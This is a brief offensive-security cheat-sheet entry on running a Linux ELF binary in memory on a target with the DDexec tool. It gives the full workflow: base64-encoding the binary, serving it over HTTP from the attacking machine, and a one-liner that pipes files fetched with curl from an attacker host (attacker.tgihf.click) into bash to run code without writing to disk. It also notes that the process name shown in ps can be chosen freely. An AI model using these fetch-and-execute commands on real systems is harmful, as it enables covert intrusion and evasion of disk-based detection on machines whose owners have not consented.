# In-Memory Execution

---

## Execute ELF without Touching Disk

[DDexec.sh](https://github.com/arget13/DDexec) can be used to execute an ELF without touching disk.

On the attacking machine, base64-encode the ELF.

```bash
$ base64 -w 0 hello-world > hello-world.b64
```

Serve `DDexec.sh` and the base64-encoded ELF you want to execute on the target via HTTP.

```bash
$ ls
DDexec.sh hello-world hello-world.b64
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On the target:

```bash
curl $URL_TO_B64_ELF | bash <(curl $URL_TO_DDEXEC) $FILENAME $ELF_ARGS
```

- `$URL_TO_B64_ELF`
	- i.e., `http://attacker.tgihf.click/hello-world.b64`
- `$URL_TO_DDEXEC`
	- i.e., `http://attacker.tgihf.click/DDexec.sh`
- `$FILENAME`
	 - Can be anything, doesn't have to match the name of the ELF
	 - This will appear as the process name in `ps`
 - `$ELF_ARGS`
	 - Space-separated list of arguments passed to the ELF

---

## References

[YouTube - ippsec - Executing Linux Binaries Without Touching Disk - Living Off The Land with DDExec and Dirty Pipe Demo](https://www.youtube.com/watch?v=MaBurwnrI4s)
